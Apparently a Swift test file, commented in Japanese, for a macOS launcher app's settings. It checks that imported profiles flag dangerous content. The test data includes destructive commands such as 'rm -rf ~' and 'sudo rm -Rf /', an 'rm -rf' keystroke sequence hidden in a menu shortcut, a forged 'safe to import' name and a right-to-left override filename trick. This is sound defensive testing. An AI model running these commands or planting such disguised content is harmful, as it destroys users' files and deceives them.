        #expect(SettingsImportPlan.suspiciousTerms(in: "osascript -e 'tell app \"Finder\" to empty trash'") == ["osascript"])
        for line in ["rm -rf ~/build", "rm -fr /tmp/x", "rm -r -f x", "sudo rm -Rf /", "cd x && rm -v -rf y"] {
            #expect(SettingsImportPlan.suspiciousTerms(in: line) == ["rm -rf"], "\(line)")
        }
        for line in ["make install", "echo curly", "rm -f build.log", "rm -r empty", "git commit -m \"sh\"", "xcrun simctl boot x"] {
            #expect(SettingsImportPlan.suspiciousTerms(in: line).isEmpty, "\(line)")
        }
    }

    /// Mac の中のファイルを開く URL（.command なども開ける）は確かめる。ウェブの URL は確かめない
    @Test func aURLThatOpensALocalFileAsksFirst() throws {
        for local in ["~/Downloads/run.command", "/Applications/Calculator.app", "file:///tmp/x.command", " FILE:///tmp/y "] {
            #expect(SettingsImportPlan.needsReview(.openURL(URLAction(url: local))), "\(local)")
        }
        for web in ["https://example.com", "//example.com/a", "mailto:a@example.com", "example.com/a", "localhost:3000", " HTTP://x "] {
            #expect(!SettingsImportPlan.needsReview(.openURL(URLAction(url: web))), "\(web)")
        }
        // ウェブとメール以外のスキームはすべて確かめる（ショートカットの実行・ssh・共有フォルダ、その別名、アプリを動かすリンク）。
        // どのスキームが何を動かすかはアプリしだいで、数え上げられない
        for tool in ["shortcuts://run-shortcut?name=x", "workflow://run-workflow?name=x", "shortcuts-production://x", " SSH://host ",
                     "smb://host/share", "cifs://host/share", "vnc://host", "obsidian://open?vault=a"] {
            #expect(SettingsImportPlan.needsReview(.openURL(URLAction(url: tool))), "\(tool)")
        }
        #expect(SettingsImportPlan.needsReview(.shortcut(ShortcutAction(name: "x", passSelectedText: false))))
        #expect(!SettingsImportPlan.needsReview(.launchApp(LaunchAppAction(app: AppReference(bundleID: "com.apple.Safari", name: "Safari"), hideIfFrontmost: false))))
        let h = try SettingsHarness()
        let open = Cell(title: "資料", icon: .symbol("doc"), action: .openURL(URLAction(url: "~/Downloads/run.command")))
        let figma = Profile(kind: .app(SettingsFixtures.figma), pages: [Page(cells: [open])])
        let plan = try #require(importPlan(h, [figma]))
        #expect(SettingsText.importConfirmation(plan).hasSuffix(
            [L10n.ui("・\("Figma") › \("資料")"), L10n.ui("アプリ: \(SettingsFixtures.figma.bundleID)"), L10n.ui("開くファイル: \("~/Downloads/run.command")")].joined(separator: "\n")
        ))
    }

    /// メニューのショートカットは1打なので、それより長いものは読み込むときに捨てる（メニューを押して動く）
    @Test func menuShortcutsLongerThanOneKeyAreDropped() throws {
        let h = try SettingsHarness()
        let figmaApp = SettingsFixtures.figma
        let hidden = Cell(title: "保存", icon: .symbol("square.and.arrow.down"), action: .menuItem(MenuItemAction(
            app: figmaApp, path: ["ファイル", "保存"],
            keyEquivalent: KeySequence(Self.typing("rm -rf ~") + [KeyChord(.special(.returnKey))])
        )))
        let normal = Cell(title: "複製", icon: .symbol("plus.square.on.square"), action: .menuItem(MenuItemAction(
            app: figmaApp, path: ["編集", "複製"], keyEquivalent: .key("d", .command)
        )))
        let figma = Profile(kind: .app(figmaApp), pages: [Page(cells: [hidden, normal])])
        // メニュー項目のマスは確かめる。長いショートカットは捨ててから見せる
        let plan = try #require(importPlan(h, [figma]))
        let text = SettingsText.importConfirmation(plan)
        #expect(!text.contains("rm -rf"))
        #expect(text.contains(L10n.ui("ショートカット: \(SettingsText.keysPreview(.key("d", .command)))")))
        h.model.markImportReviewRead()
        h.model.confirm(.importProfiles(plan))
        let imported = try #require(h.controller.configuration.profiles.first { $0.app?.bundleID == figmaApp.bundleID })
        guard case .menuItem(let saved)? = imported.pages[0].cells[0]?.action,
              case .menuItem(let duplicated)? = imported.pages[0].cells[1]?.action else {
            Issue.record("メニュー項目のマスが読み込まれていない")
            return
        }
        #expect(saved.path == ["ファイル", "保存"])
        #expect(saved.keyEquivalent == nil)
        #expect(duplicated.keyEquivalent == .key("d", .command))
    }

    /// ファイルの中の名前に改行があっても、確かめる文に自分の段落を差し込めない
    @Test func namesFromTheFileStayOnOneLine() throws {
        let h = try SettingsHarness()
        let forged = "Figma\n\nNo buttons in this file run code. It is safe to import."
        let script = Cell(title: "Build\u{202E}lmth.exe", icon: .symbol("hammer"), action: .script(ScriptAction(source: "make\n\n\u{2028}echo done")))
        let figma = Profile(kind: .app(AppReference(bundleID: SettingsFixtures.figma.bundleID, name: forged)), pages: [Page(cells: [script])])
        let plan = try #require(importPlan(h, [figma], file: "a\nb.nonetprofile"))
        #expect(plan.fileName == "a b.nonetprofile")
        let lines = SettingsText.importConfirmation(plan).components(separatedBy: "\n")
        let profileName = SettingsText.singleLine(forged, limit: SettingsText.importNameLimit)
        #expect(!profileName.contains("\n"))
        #expect(profileName.hasPrefix("Figma No buttons"))
        #expect(profileName.count == SettingsText.importNameLimit)
        // スクリプトは切らずに全部の行（空の行も）を見せる
        #expect(lines == [
            Self.reviewIntro,
            L10n.ui("・\(profileName) › \("Build lmth.exe")"),
            L10n.ui("アプリ: \(SettingsFixtures.figma.bundleID)"),
            L10n.uiCounted("スクリプト（\(4)行）:"),
            "make",
            "",
            "",
            "echo done",
        ])
    }

    @Test func cancellingThePanelsDoesNothing() async throws {
        let h = try SettingsHarness()
        let before = h.controller.configuration
        await h.model.exportProfiles(before.profiles, suggestedName: "x")
        await h.model.importProfiles()
        #expect(h.model.fileMessage == nil)
        #expect(h.controller.configuration == before)
    }

    @Test func importErrorsAreExplained() throws {
        let h = try SettingsHarness()
        let before = h.controller.configuration
        let notAProfile = h.temporaryFile("other.nonetprofile")
        try Data("{\"hello\": 1}".utf8).write(to: notAProfile)
        h.model.importProfiles(from: notAProfile)
        #expect(h.model.fileMessage == SettingsMessage(text: L10n.core("Nonet のプロファイルのファイルではありません"), isError: true))
        h.model.importProfiles(from: h.temporaryFile("missing.nonetprofile"))
        #expect(h.model.fileMessage == SettingsMessage(text: L10n.ui("ファイルを読み込めませんでした"), isError: true))
        #expect(h.controller.configuration == before)
    }

    @Test func exportErrorsAreExplained() throws {
        let h = try SettingsHarness()
        h.model.exportProfiles([], to: h.temporaryFile("empty.nonetprofile"))
        #expect(h.model.fileMessage == SettingsMessage(text: L10n.core("プロファイルが入っていません"), isError: true))
        let unwritable = h.temporaryFile("no/such/folder/x.nonetprofile")
        h.model.exportProfiles(h.controller.configuration.profiles, to: unwritable)
        #expect(h.model.fileMessage == SettingsMessage(text: L10n.ui("ファイルを書き出せませんでした"), isError: true))
    }
}

@Suite @MainActor struct SettingsModelLicenseTests {
    private func signedKey(name: String) throws -> (key: String, verifier: LicenseVerifier) {
        let pair = LicenseSigner.generateKeyPair()
        let signer = try LicenseSigner(privateKeyBase64: pair.privateKeyBase64)
        let info = LicenseInfo(licenseID: "NONET-TEST-1", licensee: name, email: "taro@example.com", issuedAt: Date(timeIntervalSince1970: 1_800_000_000))
        return (try signer.sign(info), try LicenseVerifier(publicKeyBase64: pair.publicKeyBase64))
    }

    @Test func activatesAndDeactivates() throws {
        let (key, verifier) = try signedKey(name: "山田 太郎")
        let h = try SettingsHarness(verifier: verifier)
        #expect(h.license.entitlement == .trial(daysLeft: 14))
        h.model.licenseKeyInput = "\n  \(key)  \n"
        h.model.activateLicense()
        guard case .licensed(let info) = h.license.entitlement else {
            Issue.record("登録されていない: \(h.license.entitlement)")
            return
        }
        #expect(info.licensee == "山田 太郎")
        #expect(h.model.licenseKeyInput.isEmpty)
        #expect(h.model.licenseMessage?.isError == false)

        h.model.confirmation = .deactivateLicense
        h.model.confirm(.deactivateLicense)
        #expect(h.license.entitlement == .trial(daysLeft: 14))
        #expect(h.model.licenseMessage == SettingsMessage(text: L10n.ui("この Mac から登録を消しました"), isError: false))
    }

    /// 登録を消すときの既定は、キーをクリップボードにコピーしてから消す（あとで貼り付けて登録し直せる）
    @Test func removingTheLicenseCanKeepACopyOfTheKey() throws {
        let (key, verifier) = try signedKey(name: "山田 太郎")
        let h = try SettingsHarness(verifier: verifier)
        var copied: [String] = []
        h.model.copyToPasteboard = { copied.append($0) }
        h.model.licenseKeyInput = key
        h.model.activateLicense()
        #expect(h.model.isLicensed)
        let registered = try #require(h.license.registeredLicenseKey)

        h.model.confirmation = .deactivateLicense
        h.model.confirmDeactivateLicense(copyingKey: true)
        #expect(h.model.confirmation == nil)
        #expect(copied == [registered])
        #expect(!h.model.isLicensed)
        #expect(h.model.licenseMessage == SettingsMessage(text: L10n.ui("ライセンスキーをクリップボードにコピーして、この Mac から登録を消しました"), isError: false))

        // コピーせずに消す
        h.model.licenseKeyInput = key
        h.model.activateLicense()
        h.model.confirmation = .deactivateLicense
        h.model.confirmDeactivateLicense(copyingKey: false)
        #expect(copied.count == 1)
        #expect(!h.model.isLicensed)
        #expect(h.model.licenseMessage == SettingsMessage(text: L10n.ui("この Mac から登録を消しました"), isError: false))
    }

    @Test func badKeysShowTheReason() throws {
        let (_, verifier) = try signedKey(name: "x")
        let h = try SettingsHarness(verifier: verifier)
        h.model.licenseKeyInput = "not-a-key"
        h.model.activateLicense()
        #expect(h.model.licenseMessage == SettingsMessage(text: SettingsText.licenseError(LicenseError.malformed, input: "not-a-key"), isError: true))
        #expect(h.model.licenseKeyInput == "not-a-key")
        // 別の鍵で署名したキー
        let (otherKey, _) = try signedKey(name: "y")
        h.model.licenseKeyInput = otherKey
        h.model.activateLicense()
        #expect(h.model.licenseMessage == SettingsMessage(text: SettingsText.licenseError(LicenseError.invalidSignature, input: otherKey), isError: true))
        #expect(h.license.entitlement == .trial(daysLeft: 14))
    }

    @Test func emptyInputDoesNothing() throws {
        let h = try SettingsHarness()
        h.model.licenseKeyInput = "   "
        h.model.activateLicense()
        #expect(h.model.licenseMessage == nil)
    }

    @Test func withoutAPublicKeyTheReasonIsShown() throws {
        let h = try SettingsHarness(verifier: nil)
        h.model.licenseKeyInput = "abc.def"
        h.model.activateLicense()
        #expect(h.model.licenseMessage == SettingsMessage(
            text: L10n.ui("この Nonet ではライセンスキーを確かめられません。最新の Nonet をダウンロードし直してください。"),
            isError: true
        ))
    }
}

@Suite @MainActor struct SettingsModelTestRunTests {
    @Test func testRunRecordsTheResult() async throws {
        let h = try SettingsHarness()
        let cell = try #require(h.model.selectedCell)
        await h.model.runTest(cellID: cell.id)
        #expect(h.performer.performed.contains(cell.action))
        let record = try #require(h.model.testRun(for: cell.id)?.record)
        #expect(record.succeeded)
        #expect(record.cellTitle == "Safari")
        #expect(h.model.testRun(for: UUID()) == nil)
    }

    @Test func failuresCarryTheMessage() async throws {
        let h = try SettingsHarness()
        h.performer.error = .appNotFound("Safari")
        let cell = try #require(h.model.selectedCell)
        await h.model.runTest(cellID: cell.id)
        let record = try #require(h.model.testRun(for: cell.id)?.record)
        #expect(!record.succeeded)
        #expect(SettingsText.testResult(record) == NonetError.appNotFound("Safari").localizedDescription)
    }

    @Test func unknownCellsAreIgnored() async throws {
        let h = try SettingsHarness()
        await h.model.runTest(cellID: UUID())
        #expect(h.performer.performed.isEmpty)
        #expect(h.model.lastTestRun == nil)
    }
}

/// 偽物のキー配列: ⌥X とキーコード 0x2E が改行（CR）になる。ほかは修飾キーを無視した文字
final class FakeKeyCharacters: SettingsKeyCharacterTranslating {
    func characters(for chord: KeyChord) -> String? {
        switch chord.key {
        case .character("x") where chord.modifiers == .option:
            "\r"
        case .character(let character):
            character
        case .keyCode(0x2E):
            "\r"
        // 修飾キー（Shift など）は文字を打たない
        case .keyCode(56):
            nil
        case .keyCode:
            "a"
        case .special:
            nil
        }
    }
}

/// ファイルのアクション（Finder で選んでいるファイルの操作）の設定
@Suite @MainActor struct SettingsFileActionTests {
    private func review(_ action: Action) -> [String] {
        let reviewed = SettingsImportPlan.ReviewedCell(profileName: "p", cell: Cell(title: "t", icon: .symbol("doc"), action: action), pressesSubmitKey: false)
        return SettingsText.reviewLines(for: reviewed).map(\.text)
    }

    @Test func everyOperationIsInTheImportReview() {
        for operation in FileOperation.allCases {
            #expect(SettingsImportPlan.needsReview(.file(FileAction(operation: operation))), "\(operation)")
            #expect(review(.file(FileAction(operation: operation))) == [L10n.ui("Finder で選んだファイルを: \(operation.title)")])
        }
        #expect(!SettingsImportPlan.pressesSubmitKey(.file(FileAction(operation: .trash)), keys: nil))
    }

    @Test func aNewFileCellDuplicatesAndIsNeverIncomplete() {
        #expect(SettingsCellEditing.defaultAction(for: .file) == .file(FileAction(operation: .duplicate)))
        for operation in FileOperation.allCases {
            #expect(!SettingsCellEditing.isIncomplete(.file(FileAction(operation: operation))))
        }
        #expect(SettingsActionKinds.symbol(.file) == "doc")
    }

    @Test func theIconFollowsTheOperationUnlessTheUserPickedOne() {
        var cell = SettingsCellEditing.newCell(kind: .file)
        for operation in FileOperation.allCases {
            cell = SettingsCellEditing.replacingAction(.file(FileAction(operation: operation)), in: cell)
            #expect(cell.icon == .symbol(SettingsActionKinds.symbol(operation)), "\(operation)")
        }
        // 利用者が選んだアイコンは変えない
        cell.icon = .symbol("star")
        cell = SettingsCellEditing.replacingAction(.file(FileAction(operation: .trash)), in: cell)
        #expect(cell.icon == .symbol("star"))
        // 種類を替えたら、その種類のアイコンに戻る（自動のアイコンのとき）
        var automatic = SettingsCellEditing.newCell(kind: .file)
        automatic = SettingsCellEditing.replacingAction(.file(FileAction(operation: .trash)), in: automatic)
        automatic = SettingsCellEditing.changingKind(of: automatic, to: .openURL)
        #expect(automatic.icon == .symbol(SettingsActionKinds.symbol(.openURL)))
    }

    @Test func theTitleFollowsTheOperationUntilTheUserNamesIt() {
        var cell = SettingsCellEditing.newCell(kind: .file)
        cell = SettingsCellEditing.replacingAction(.file(FileAction(operation: .trash)), in: cell)
        #expect(cell.title == FileOperation.trash.title)
        cell.title = "片付け"
        cell = SettingsCellEditing.replacingAction(.file(FileAction(operation: .rename)), in: cell)
        #expect(cell.title == "片付け")
    }

    @Test func choosingTheTrashTurnsOnTheHoldOnceAndLeavesItToTheUserAfter() throws {
        let h = try SettingsHarness()
        h.model.createCell(kind: .file, at: 1)
        let id = try #require(h.model.selectedCell?.id)
        #expect(h.model.cell(id: id)?.requiresHold == false)
        // ゴミ箱に入れるを選ぶと、押し間違えを防ぐ「少し長く止めてから実行」が入る
        h.model.chooseFileOperation(.trash, forCell: id)
        #expect(h.model.cell(id: id)?.action == .file(FileAction(operation: .trash)))
        #expect(h.model.cell(id: id)?.requiresHold == true)
        // 外したら、選び直さない限り戻さない
        h.model.setRequiresHold(false, ofCell: id)
        h.model.chooseFileOperation(.trash, forCell: id)
        #expect(h.model.cell(id: id)?.requiresHold == false)
        // 別の操作へ変えても、手動の設定を変えない
        h.model.setRequiresHold(true, ofCell: id)
        h.model.chooseFileOperation(.duplicate, forCell: id)
        #expect(h.model.cell(id: id)?.requiresHold == true)
        #expect(h.model.cell(id: id)?.action == .file(FileAction(operation: .duplicate)))
    }

    @Test func aFileCellDoesNotChangeWhenAnotherKindIsEdited() throws {
        let h = try SettingsHarness()
        h.model.createCell(kind: .file, at: 1)
        let id = try #require(h.model.selectedCell?.id)
        h.model.updateAction(ofCell: id, as: URLAction.self) { $0.url = "https://example.com" }
        #expect(h.model.cell(id: id)?.action == .file(FileAction(operation: .duplicate)))
    }

    @Test func testRunningAFileOperationAsksFirst() async throws {
        let h = try SettingsHarness()
        h.model.createCell(kind: .file, at: 1)
        let id = try #require(h.model.selectedCell?.id)
        h.model.chooseFileOperation(.trash, forCell: id)
        h.model.startTestRun(cellID: id)
        #expect(h.model.confirmation == .testRunFile(cellID: id, operation: FileOperation.trash.title))
        #expect(h.model.testRun(for: id) == nil)
        // やめたら、何も実行しない
        h.model.confirmation = nil
        #expect(h.model.testRun(for: id) == nil)
    }

    /// 確かめて「実行」を選べば、そのファイルの操作を1回だけ実行して結果を出す
    @Test func confirmingAFileTestRunRunsIt() async throws {
        let h = try SettingsHarness()
        h.model.createCell(kind: .file, at: 1)
        let id = try #require(h.model.selectedCell?.id)
        h.model.chooseFileOperation(.trash, forCell: id)
        h.model.startTestRun(cellID: id)
        let confirmation = try #require(h.model.confirmation)
        h.model.confirm(confirmation)
        #expect(h.model.confirmation == nil)
        for _ in 0..<400 where h.model.testRun(for: id)?.record == nil {
            try await Task.sleep(for: .milliseconds(5))
        }
        #expect(h.model.testRun(for: id)?.record != nil)
        #expect(h.performer.performed.filter { $0 == .file(FileAction(operation: .trash)) }.count == 1)
    }

    /// 「画面に置く」の場所を選ぶと、アクションの場所が変わり、自動の名前は場所に合わせる（自分で付けた名前は残す）。ほかの種類のマスは変えない
    @Test func choosingAPlacementRegion() throws {
        let h = try SettingsHarness()
        h.model.createCell(kind: .placeWindow, at: 1)
        let id = try #require(h.model.selectedCell?.id)
        h.model.choosePlaceWindowRegion(.right, forCell: id)
        let cell = try #require(h.model.cell(id: id))
        #expect(cell.action == .placeWindow(PlaceWindowAction(region: .right)))
        #expect(cell.title == SettingsCellEditing.automaticTitle(for: cell.action))
        h.model.updateCell(id: id) { $0.title = "右へ" }
        h.model.choosePlaceWindowRegion(.left, forCell: id)
        #expect(h.model.cell(id: id)?.action == .placeWindow(PlaceWindowAction(region: .left)))
        #expect(h.model.cell(id: id)?.title == "右へ")
        let safari = try #require(h.model.selectedProfile.pages[0].cells[0])
        h.model.choosePlaceWindowRegion(.right, forCell: safari.id)
        #expect(h.model.cell(id: safari.id) == safari)
    }

    /// マスをページの見出しへ落とすと、そのページの最初の空きマスへ移る。同じページ・いっぱいのページ・ほかのプロファイルには移さない
    @Test func droppingACellOnAPageHeader() throws {
        let h = try SettingsHarness()
        let profile = h.model.selectedProfile
        h.controller.update { _ = $0.addPage(profileID: profile.id) }
        let source = CellAddress(page: 0, index: 0)
        let moved = try #require(SettingsGrid.cell(at: source, in: h.model.selectedProfile))
        #expect(!h.model.handleDrop(.cell(profileID: profile.id, address: source), ontoPage: 0))
        #expect(!h.model.handleDrop(.cell(profileID: UUID(), address: source), ontoPage: 1))
        #expect(h.model.handleDrop(.cell(profileID: profile.id, address: source), ontoPage: 1))
        let pages = h.model.selectedProfile.pages
        #expect(pages[0].cells[0] == nil)
        #expect(pages[1].cells.contains(moved))
        #expect(h.model.pageIndex == 1)
    }

    @Test func testRunningAnotherKindDoesNotAsk() throws {
        let h = try SettingsHarness()
        h.model.createCell(kind: .openURL, at: 2)
        let id = try #require(h.model.selectedCell?.id)
        h.model.startTestRun(cellID: id)
        #expect(h.model.confirmation == nil)
    }
}
